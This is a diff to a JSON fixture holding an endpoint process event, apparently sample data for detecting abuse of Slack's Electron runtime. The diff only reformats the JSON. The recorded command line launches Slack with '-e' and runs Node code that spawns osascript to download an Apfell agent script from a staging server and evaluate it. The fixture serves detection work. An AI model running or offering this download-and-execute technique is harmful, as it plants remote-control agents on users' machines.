@@ -1,4 +1,5 @@
-{
+[
+  {
         "_index" : ".ds-logs-endpoint.events.process-default-000002",
         "_id" : "iWik3HYBORzSN0EU24mp",
         "_source" : {
@@ -19,7 +20,7 @@
             "args" : [
               "/Applications/Slack.app/Contents/MacOS/Slack",
               "-e",
-              """const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);"""
+              "const { spawn } = require(\"child_process\"); spawn(\"osascript\", [\"-l\",\"JavaScript\",\"-e\",\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));\"]);"
             ],
             "parent" : {
               "args" : [ ],
@@ -32,7 +33,7 @@
             "pid" : 10160,
             "args_count" : 3,
             "entity_id" : "YzJkOWNlOWEtZmRlZi1hNDA1LTEyNWMtMTcxYTkxZDBlNTRhLTEwMTYwLTEzMjU0NDkzMTQ5LjU2MTY2OTAwMA==",
-            "command_line" : """/Applications/Slack.app/Contents/MacOS/Slack -e const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);""",
+            "command_line" : "/Applications/Slack.app/Contents/MacOS/Slack -e const { spawn } = require(\"child_process\"); spawn(\"osascript\", [\"-l\",\"JavaScript\",\"-e\",\"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));\"]);",
             "executable" : "/Applications/Slack.app/Contents/MacOS/Slack",
             "hash" : {
               "sha1" : "c0c0fe5b7e45c99505ead92de6a27591e5969639",
@@ -122,3 +123,4 @@
           }
         }
       }
+    ]
